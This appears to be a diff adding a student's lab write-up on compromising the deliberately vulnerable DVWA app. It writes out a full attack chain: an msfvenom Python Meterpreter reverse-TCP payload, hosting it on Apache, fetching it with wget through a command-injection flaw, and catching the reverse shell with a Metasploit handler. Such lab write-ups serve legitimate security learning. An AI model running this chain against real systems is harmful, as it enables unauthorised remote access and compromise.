@@ -1,0 +1,26 @@
+
+
+Today, I successfully gained a Meterpreter shell on the target machine through a multi-step exploitation process.
+ First, I generated a Python Meterpreter payload using msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.63.1 LPORT=600 -o tester.py and saved it to my desktop.
+ I then started my Apache2 server with systemctl start apache2 and copied the payload to the web root using cp /home/paulzion/Desktop/tester.py /var/www/html/.
+ After verifying the file was accessible by browsing to http://192.168.63.1/tester.py,
+ I moved to the DVWA target machine. From the DVWA command execution vulnerability,
+ I executed wget http://192.168.63.1/tester.py to download the payload. Meanwhile,
+ I set up my Metasploit listener using use exploit/multi/handler, configured the payload as python/meterpreter/reverse_tcp, 
+set LHOST to 192.168.63.1,
+ LPORT to 600, and ran the handler.
+ Finally, I executed the Python script on the target with python tester.py, which initiated a reverse connection back to my listener,
+ granting me Meterpreter access where I successfully ran commands like getuid and sysinfo to verify compromise.
+
+
+
+Achievements from this project
+1. Generating reverse shell payloads with msfvenom
+2. Setting up Metasploit handlers to catch connections
+3. Hosting payloads on Apache for remote download
+4. Transferring files to target using wget
+5. Exploiting command injection vulnerabilities
+6. Establishing Meterpreter reverse shell sessions
+7. Running post-exploitation enumeration commands
+8. Understanding IP/port configuration importance
+9. Executing multi-step attack chains for successful compromise
